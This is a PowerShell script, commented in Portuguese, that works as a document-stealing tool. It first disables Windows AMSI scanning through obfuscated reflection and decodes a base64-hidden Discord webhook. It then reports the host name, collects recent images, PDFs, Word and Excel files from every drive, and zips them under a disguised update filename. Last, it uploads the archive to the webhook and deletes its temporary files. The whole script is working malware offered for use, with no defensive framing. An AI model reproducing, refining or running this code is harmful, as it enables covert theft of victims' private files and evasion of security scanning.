# [V21: Bypass AMSI por Substituição Dinâmica]
$n = "System.Management.Automation.AM-SI-Ut-ils".Replace("-","")
$t = [Ref].Assembly.GetType($n)
$f = $t.GetField("am-si-Init-Fa-iled".Replace("-",""), "NonPublic,Static")
$f.SetValue($null, $true)

# 1. Configurações e TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$wEnc = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NDM2MTE5NTQ0MzE5NjA2Ni9Hb1g5NjE5cmZuUzd6aGE4TUJaelhFZHNSZVNGb3NGWUZidEZ5VmZOUHZ4eWJKWHlYVnc3VGtMUG9qNU0tZzZuV2FYWA=="
$u = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($wEnc))

# Notificação de Diagnóstico (Sem modo oculto para teste)
curl.exe -k -s -F "content=🚀 V21 (Stealth) Ativo: $env:COMPUTERNAME" $u

$tempDir = "$env:TEMP\cache_$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

# 2. Procura e Exfiltração (Conforme as tuas prioridades de treino/metas)
$e = @('*.jpg', '*.pdf', '*.docx', '*.xlsx')
Get-PSDrive -PSProvider FileSystem | ForEach-Object {
    Get-ChildItem -Path $_.Root -Include $e -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
        $p = $_.FullName
        $isEx = $false; foreach($d in @("C:\Windows", "C:\Program Files")){if($p.StartsWith($d)){$isEx=$true;break}}
        !$isEx -and $_.LastWriteTime -gt (Get-Date).AddDays(-30) -and $_.Length -lt 15MB
    } | ForEach-Object { Copy-Item $_.FullName -Destination $tempDir -ErrorAction SilentlyContinue }
}

$zipFile = "$env:TEMP\win_upd.tmp"
if ((Get-ChildItem $tempDir).Count -gt 0) {
    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipFile -Force
    curl.exe -k -s -F "file=@$zipFile" $u
}

Remove-Item $tempDir -Recurse -Force; Remove-Item $zipFile -Force; exit
